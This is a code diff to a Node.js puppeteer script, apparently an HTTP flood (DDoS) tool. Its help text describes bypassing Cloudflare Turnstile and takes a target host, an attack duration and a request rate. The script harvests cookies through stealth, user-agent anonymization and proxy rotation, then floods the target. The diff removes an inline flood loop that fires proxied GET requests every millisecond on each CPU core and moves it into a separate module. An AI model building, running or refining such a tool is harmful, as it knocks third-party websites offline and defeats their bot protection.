@@ -6,22 +6,42 @@ const puppeteer = require("puppeteer-extra");
 const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
 const anonymizeUA = require("puppeteer-extra-plugin-anonymize-ua")();
 const resemble = require('resemblejs');
-const { request } = require('undici');
-const HttpProxyAgent = require('http-proxy-agent');
+const flood = require('./flood');
 var HeadersBrowser = '';
 
 const stealthPlugin = puppeteerStealth();
 puppeteer.use(stealthPlugin);
 puppeteer.use(anonymizeUA);
 
-if (process.argv.length < 4) {
-    console.error("node brow <target> <duration>");
+if (process.argv.includes('-h') || process.argv.includes('--help')) {
+  console.log(`
+Usage: node browsern.js <host> <duration> <rates> [options]
+
+Bypass Cloudflare Turnstile and Custom Cloudflare Turnstile protections
+
+Arguments:
+  <host>                 Target host (e.g., http://example.com)
+  <duration>             Attack duration per second
+  <rates>                Requests rate per second
+
+Options:
+  --proxy <file>              Set proxy server file
+  --fingerprint <type>        Set fingerprints types (basic, advaced)  [default: none]
+  --dratelimit <true>/false>  Set Automating ratelimit detection [default: false]
+  -h, --help                  Display help and usage instructions
+  `);
+  process.exit(0);
+}
+
+if (process.argv.length < 5) {
+    console.error("node browsern <duration> <rates> <proxyFile> [options]");
     process.exit(1);
 }
 
 const host = process.argv[2];
 const duration = process.argv[3];
-const args = process.argv.slice(4);
+const rates = process.argv[4];
+const args = process.argv.slice(5);
 
 const proxyIndex = args.indexOf('--proxy');
 const proxyFile = proxyIndex !== -1 ? args[proxyIndex + 1] : null;
@@ -179,8 +199,8 @@ async function detectChallenge(browser, page) {
                    width: 307, height: 125,
               },
             });
-            const image1 = fs.readFileSync('capt.png');
-            const image2 = fs.readFileSync('./brow/captcha.png');
+            const image1 = fs.readFileSync('01.png');
+            const image2 = fs.readFileSync('./ex/captcha.png');
             const compareImages = (image1, image2) => {
               return new Promise((resolve, reject) => {
                 resemble(image1)
@@ -215,7 +235,6 @@ async function detectChallenge(browser, page) {
 }
 
 async function openBrowser(host, proxy = null) {
-    const cpuCount = os.cpus().length;
     const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
     const options = {
       headless: 'new',
@@ -285,7 +304,6 @@ async function openBrowser(host, proxy = null) {
           if (cookies.length > 0) {
             const _cookie = cookies.map((c) => `${c.name}=${c.value}`).join("; ");
             console.log(`[INFO] UserAgent: ${userAgent}`);
-            console.log(`[INFO] Flood started on ${cpuCount} cores for ${duration} seconds`);
             console.log(`[INFO] Cookies: ${_cookie}`);
           }
           return {
@@ -323,58 +341,13 @@ async function Start(host) {
          process.exit(0);
          }, duration * 1000);
        if (proxyFile) {
-         flood(host, duration, response.userAgent, response.cookies, response.headersall, response.proxy);
+         flood(host, duration, rates, response.userAgent, response.cookies, response.headersall, response.proxy);
        } else {
-        flood(host, duration, response.userAgent, response.cookies, response.headersall);
+        flood(host, duration, rates, response.userAgent, response.cookies, response.headersall);
        }
      }
   } catch (error) {
     console.log(`[ERROR] ${error}`);
-  }
-}
-async function flood(host, duration, userAgent, cookies, headersbro, proxy = null) {
-  const headersall = headersbro;
-  const endTime = Date.now() + duration * 1000;
-  console.log(headersall)
-  const agent = proxy ? new HttpsProxyAgent(proxy) : undefined;
-  const cpuCount = os.cpus().length;
-
-  async function sendRequest() {
-    try {
-      const response = await request(host, {
-        method: 'GET',
-        headers: {
-          'User-Agent': userAgent,
-          'accept': headersall['accept'],
-	  'accept-language': headersall['accept-language'],
-          'accept-encoding': headersall['accept-encoding'],
-	  'cache-control': 'no-cache, no-store,private, max-age=0, must-revalidate',
-	  'upgrade-insecure-requests': '1',
-          'sec-fetch-dest': headersall['sec-fetch-dest'],
-	  'sec-fetch-mode': headersall['sec-fetch-mode'],
-	  'sec-fetch-site': headersall['sec-fetch-site'],
-          'TE': headersall['trailers'],
-          'x-requested-with': 'XMLHttpRequest',
-          'pragma': 'no-cache',
-          'cache-control': 'no-cache',
-          Cookie: cookies,
-        },
-        dispatcher: agent,
-      });
-    } catch (error) {
-     console.log(error);
-    }
-  }
-
-  for (let i = 0; i < cpuCount; i++) {
-    const intervalId = setInterval(() => {
-      if (Date.now() >= endTime) {
-        clearInterval(intervalId);
-        console.log(`[+] Flood completed for core ${i + 1}`);
-      } else {
-        sendRequest();
-      }
-    }, 1); 
   }
 }
 async function checkProxy(proxy) {
